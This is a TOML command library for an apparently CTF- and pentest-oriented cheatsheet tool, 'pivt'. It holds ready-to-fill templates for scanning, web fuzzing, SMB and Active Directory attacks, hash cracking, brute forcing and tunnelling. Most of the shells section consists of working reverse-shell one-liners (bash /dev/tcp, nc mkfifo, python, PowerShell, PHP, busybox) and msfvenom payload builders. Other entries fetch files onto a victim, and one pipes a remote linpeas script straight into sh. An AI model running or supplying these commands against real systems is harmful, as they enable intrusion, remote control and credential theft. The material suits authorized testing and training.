# pivt bundled cheatsheet. Placeholders look like <RHOST>, <LPORT>, etc.
# Copy ~/.config/pivt/commands.toml to add/override your own (same format).

# ───────────────────────── recon / nmap ─────────────────────────
[[command]]
category = "nmap"
name = "Quick top-ports"
description = "Fast sweep of top 1000 ports, service+version"
template = "nmap -sC -sV --open -T4 <RHOST> -oN nmap/quick.txt"
tags = ["recon", "ports", "scan"]

[[command]]
category = "nmap"
name = "Full TCP all-ports"
description = "Every TCP port, then re-scan found ones with scripts"
template = "nmap -p- --min-rate 5000 -T4 <RHOST> -oN nmap/allports.txt"
tags = ["recon", "ports", "full"]

[[command]]
category = "nmap"
name = "UDP top-100"
description = "Common UDP services (slow)"
template = "sudo nmap -sU --top-ports 100 -T4 <RHOST> -oN nmap/udp.txt"
tags = ["recon", "udp"]

[[command]]
category = "nmap"
name = "Vuln scripts"
description = "Run NSE vuln category against a host"
template = "nmap -sV --script vuln <RHOST> -oN nmap/vuln.txt"
tags = ["recon", "nse", "vuln"]

[[command]]
category = "nmap"
name = "Ping sweep subnet"
description = "Host discovery across a /24"
template = "nmap -sn <RHOST>/24 -oN nmap/sweep.txt"
tags = ["recon", "discovery"]

# ───────────────────────── web ─────────────────────────
[[command]]
category = "web"
name = "ffuf dirs"
description = "Directory/file fuzzing"
template = "ffuf -u <URL>/FUZZ -w <WORDLIST> -mc 200,204,301,302,307,401,403 -t 50"
tags = ["web", "fuzz", "dirs"]

[[command]]
category = "web"
name = "ffuf vhost"
description = "Virtual host / subdomain fuzzing via Host header"
template = "ffuf -u <URL> -H 'Host: FUZZ.<DOMAIN>' -w <WORDLIST> -fs 0"
tags = ["web", "fuzz", "vhost", "subdomain"]

[[command]]
category = "web"
name = "ffuf extensions"
description = "Fuzz files with common extensions"
template = "ffuf -u <URL>/FUZZ -w <WORDLIST> -e .php,.txt,.html,.bak -mc all -fc 404"
tags = ["web", "fuzz", "files"]

[[command]]
category = "web"
name = "gobuster dir"
description = "Classic directory brute force"
template = "gobuster dir -u <URL> -w <WORDLIST> -t 50 -x php,txt,html"
tags = ["web", "fuzz", "dirs"]

[[command]]
category = "web"
name = "feroxbuster recursive"
description = "Recursive content discovery"
template = "feroxbuster -u <URL> -w <WORDLIST> -t 50 -d 2"
tags = ["web", "fuzz", "recursive"]

[[command]]
category = "web"
name = "nikto"
description = "Baseline web server vuln scan"
template = "nikto -h <URL>"
tags = ["web", "scan"]

[[command]]
category = "web"
name = "wpscan enumerate"
description = "WordPress users + vulnerable plugins"
template = "wpscan --url <URL> --enumerate u,vp,vt --api-token YOUR_TOKEN"
tags = ["web", "wordpress"]

[[command]]
category = "web"
name = "curl verbose"
description = "Inspect raw response + headers"
template = "curl -skiL <URL> -H 'User-Agent: Mozilla/5.0'"
tags = ["web", "curl"]

# ───────────────────────── smb / shares ─────────────────────────
[[command]]
category = "smb"
name = "smbmap anon"
description = "List shares + permissions, null session"
template = "smbmap -H <RHOST> -u '' -p ''"
tags = ["smb", "enum"]

[[command]]
category = "smb"
name = "smbclient list"
description = "Enumerate shares with null session"
template = "smbclient -L //<RHOST>/ -N"
tags = ["smb", "enum"]

[[command]]
category = "smb"
name = "smbclient connect"
description = "Connect to a share (fill share after //)"
template = "smbclient //<RHOST>/SHARE -U '<USER>%<PASS>'"
tags = ["smb", "access"]

[[command]]
category = "smb"
name = "crackmapexec shares"
description = "Auth + list shares, spray-friendly"
template = "crackmapexec smb <RHOST> -u '<USER>' -p '<PASS>' --shares"
tags = ["smb", "cme", "ad"]

[[command]]
category = "smb"
name = "enum4linux-ng"
description = "Full SMB/RPC enumeration"
template = "enum4linux-ng -A <RHOST>"
tags = ["smb", "enum"]

# ───────────────────────── reverse shells ─────────────────────────
[[command]]
category = "shells"
name = "bash tcp"
description = "Classic bash reverse shell one-liner"
template = "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
tags = ["shell", "revshell", "bash"]

[[command]]
category = "shells"
name = "nc mkfifo"
description = "Netcat reverse shell without -e"
template = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"
tags = ["shell", "revshell", "nc"]

[[command]]
category = "shells"
name = "python3 pty"
description = "Python3 reverse shell with pty"
template = "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
tags = ["shell", "revshell", "python"]

[[command]]
category = "shells"
name = "powershell tcp"
description = "Windows PowerShell reverse shell"
template = "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\""
tags = ["shell", "revshell", "windows", "powershell"]

[[command]]
category = "shells"
name = "nc listener"
description = "Catch a shell (your side)"
template = "nc -lvnp <LPORT>"
tags = ["shell", "listener"]

[[command]]
category = "shells"
name = "rlwrap listener"
description = "Listener with readline (arrow keys/history)"
template = "rlwrap nc -lvnp <LPORT>"
tags = ["shell", "listener", "rlwrap"]

[[command]]
category = "shells"
name = "msfvenom elf"
description = "Linux reverse shell binary"
template = "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf"
tags = ["shell", "msfvenom", "payload"]

[[command]]
category = "shells"
name = "msfvenom exe"
description = "Windows reverse shell binary"
template = "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe"
tags = ["shell", "msfvenom", "windows"]

# ───────────────────────── tty / shell upgrade ─────────────────────────
[[command]]
category = "upgrade"
name = "python pty spawn"
description = "Upgrade dumb shell to pty"
template = "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
tags = ["upgrade", "tty"]

[[command]]
category = "upgrade"
name = "stty raw (local)"
description = "Run on YOUR box after Ctrl-Z backgrounds the shell"
template = "stty raw -echo; fg; reset; export TERM=xterm-256color"
tags = ["upgrade", "tty", "stty"]

[[command]]
category = "upgrade"
name = "script trick"
description = "Alternative pty upgrade"
template = "script -qc /bin/bash /dev/null"
tags = ["upgrade", "tty"]

# ───────────────────────── file transfer ─────────────────────────
[[command]]
category = "transfer"
name = "python http server"
description = "Serve cwd over HTTP (your box)"
template = "python3 -m http.server <LPORT>"
tags = ["transfer", "http", "server"]

[[command]]
category = "transfer"
name = "wget pull"
description = "Download from your server (victim side)"
template = "wget http://<LHOST>:<LPORT>/<FILE> -O /tmp/<FILE>"
tags = ["transfer", "wget"]

[[command]]
category = "transfer"
name = "curl pull"
description = "Download via curl (victim side)"
template = "curl http://<LHOST>:<LPORT>/<FILE> -o /tmp/<FILE>"
tags = ["transfer", "curl"]

[[command]]
category = "transfer"
name = "powershell download"
description = "Windows file pull"
template = "powershell -c \"Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -OutFile C:\\Windows\\Temp\\<FILE>\""
tags = ["transfer", "windows", "powershell"]

[[command]]
category = "transfer"
name = "nc send (sender)"
description = "Pipe a file over nc — receiver: nc -lvnp <LPORT> > out"
template = "nc <LHOST> <LPORT> < <FILE>"
tags = ["transfer", "nc"]

[[command]]
category = "transfer"
name = "smbserver impacket"
description = "Quick SMB share for Windows pulls"
template = "impacket-smbserver share . -smb2support -user <USER> -password <PASS>"
tags = ["transfer", "smb", "impacket"]

# ───────────────────────── active directory ─────────────────────────
[[command]]
category = "ad"
name = "kerbrute users"
description = "Validate usernames via Kerberos pre-auth"
template = "kerbrute userenum -d <DOMAIN> --dc <RHOST> <WORDLIST>"
tags = ["ad", "kerberos", "enum"]

[[command]]
category = "ad"
name = "GetNPUsers (ASREP)"
description = "AS-REP roastable users"
template = "impacket-GetNPUsers <DOMAIN>/ -usersfile <WORDLIST> -dc-ip <RHOST> -no-pass"
tags = ["ad", "asrep", "impacket"]

[[command]]
category = "ad"
name = "GetUserSPNs (kerberoast)"
description = "Request service ticket hashes"
template = "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <RHOST> -request"
tags = ["ad", "kerberoast", "impacket"]

[[command]]
category = "ad"
name = "secretsdump"
description = "Dump hashes with creds (DCSync if privileged)"
template = "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<RHOST>"
tags = ["ad", "dump", "impacket"]

[[command]]
category = "ad"
name = "evil-winrm"
description = "WinRM shell with creds or hash"
template = "evil-winrm -i <RHOST> -u <USER> -p '<PASS>'"
tags = ["ad", "winrm", "shell"]

[[command]]
category = "ad"
name = "bloodhound-python"
description = "Collect AD graph data remotely"
template = "bloodhound-python -d <DOMAIN> -u <USER> -p '<PASS>' -ns <RHOST> -c all"
tags = ["ad", "bloodhound"]

[[command]]
category = "ad"
name = "ldapsearch anon"
description = "Dump naming contexts anonymously"
template = "ldapsearch -x -H ldap://<RHOST> -s base namingcontexts"
tags = ["ad", "ldap", "enum"]

# ───────────────────────── password / hash cracking ─────────────────────────
[[command]]
category = "crack"
name = "hashcat NTLM"
description = "Crack NTLM (mode 1000)"
template = "hashcat -m 1000 <FILE> <WORDLIST> -r /usr/share/hashcat/rules/best64.rule"
tags = ["crack", "hashcat", "ntlm"]

[[command]]
category = "crack"
name = "hashcat kerberoast"
description = "Crack TGS-REP (mode 13100)"
template = "hashcat -m 13100 <FILE> <WORDLIST>"
tags = ["crack", "hashcat", "kerberoast"]

[[command]]
category = "crack"
name = "hashcat asrep"
description = "Crack AS-REP (mode 18200)"
template = "hashcat -m 18200 <FILE> <WORDLIST>"
tags = ["crack", "hashcat", "asrep"]

[[command]]
category = "crack"
name = "john auto"
description = "John with auto format detect"
template = "john <FILE> --wordlist=<WORDLIST>"
tags = ["crack", "john"]

[[command]]
category = "crack"
name = "hydra http-post"
description = "Brute a login form"
template = "hydra -l <USER> -P <WORDLIST> <RHOST> http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"
tags = ["crack", "hydra", "web"]

[[command]]
category = "crack"
name = "hydra ssh"
description = "SSH password spray"
template = "hydra -l <USER> -P <WORDLIST> ssh://<RHOST>"
tags = ["crack", "hydra", "ssh"]

[[command]]
category = "crack"
name = "ssh2john"
description = "Extract hash from an encrypted private key"
template = "ssh2john <FILE> > key.hash"
tags = ["crack", "john", "ssh"]

# ───────────────────────── pivot / tunnel ─────────────────────────
[[command]]
category = "pivot"
name = "chisel server"
description = "Reverse tunnel server (your box)"
template = "chisel server -p <LPORT> --reverse"
tags = ["pivot", "chisel"]

[[command]]
category = "pivot"
name = "chisel client socks"
description = "Victim connects back, opens SOCKS proxy"
template = "chisel client <LHOST>:<LPORT> R:socks"
tags = ["pivot", "chisel", "socks"]

[[command]]
category = "pivot"
name = "ssh dynamic socks"
description = "SOCKS proxy over SSH"
template = "ssh -D 1080 -N <USER>@<RHOST>"
tags = ["pivot", "ssh", "socks"]

[[command]]
category = "pivot"
name = "ssh local forward"
description = "Expose a remote port locally"
template = "ssh -L <LPORT>:127.0.0.1:<RPORT> <USER>@<RHOST>"
tags = ["pivot", "ssh", "forward"]

# ───────────────────────── privesc / misc ─────────────────────────
[[command]]
category = "misc"
name = "linpeas pull+run"
description = "Fetch and run linpeas (victim side)"
template = "curl -sL http://<LHOST>:<LPORT>/linpeas.sh | sh"
tags = ["privesc", "linux", "linpeas"]

[[command]]
category = "misc"
name = "sudo -l"
description = "What can current user run as root"
template = "sudo -l"
tags = ["privesc", "linux"]

[[command]]
category = "misc"
name = "find SUID"
description = "Hunt SUID binaries"
template = "find / -perm -4000 -type f 2>/dev/null"
tags = ["privesc", "linux", "suid"]

[[command]]
category = "misc"
name = "writable dirs"
description = "World-writable directories"
template = "find / -writable -type d 2>/dev/null | grep -v proc"
tags = ["privesc", "linux"]

[[command]]
category = "misc"
name = "add /etc/hosts"
description = "Map a vhost/domain to the target"
template = "echo '<RHOST> <DOMAIN>' | sudo tee -a /etc/hosts"
tags = ["misc", "hosts", "dns"]

# ───────────────────────── from the ctf shell kit ─────────────────────────
[[command]]
category = "shells"
name = "php tcp"
description = "PHP reverse shell one-liner"
template = "php -r '$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
tags = ["shell", "revshell", "php"]

[[command]]
category = "shells"
name = "busybox nc"
description = "busybox netcat reverse shell (-e)"
template = "busybox nc <LHOST> <LPORT> -e /bin/sh"
tags = ["shell", "revshell", "busybox"]

[[command]]
category = "encode"
name = "base64 encode"
description = "base64 a string (no wrap)"
template = "echo -n '<DATA>' | base64 -w0; echo"
tags = ["encode", "base64"]

[[command]]
category = "encode"
name = "base64 decode"
description = "decode base64"
template = "echo -n '<DATA>' | base64 -d; echo"
tags = ["encode", "base64"]

[[command]]
category = "encode"
name = "url encode"
description = "percent-encode a string"
template = "python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(\"<DATA>\",safe=\"\"))'"
tags = ["encode", "url"]

[[command]]
category = "encode"
name = "url decode"
description = "decode a percent-encoded string"
template = "python3 -c 'import sys,urllib.parse;print(urllib.parse.unquote(\"<DATA>\"))'"
tags = ["encode", "url"]

[[command]]
category = "nmap"
name = "full → detail (-oA)"
description = "all ports, then service scan the open ones (kit 'scan full')"
template = "nmap -p- -T4 --min-rate 5000 -oA nmap/full <RHOST>"
tags = ["recon", "ports", "oA"]

[[command]]
category = "web"
name = "web recon (multi)"
description = "whatweb + ffuf dirs — opens one run tab each"
template = "whatweb <URL> ; ffuf -u <URL>/FUZZ -w <WORDLIST> -mc 200,301,302,403"
tags = ["web", "playbook", "recon"]
steps = ["whatweb <URL>", "ffuf -u <URL>/FUZZ -w <WORDLIST> -mc 200,301,302,403"]
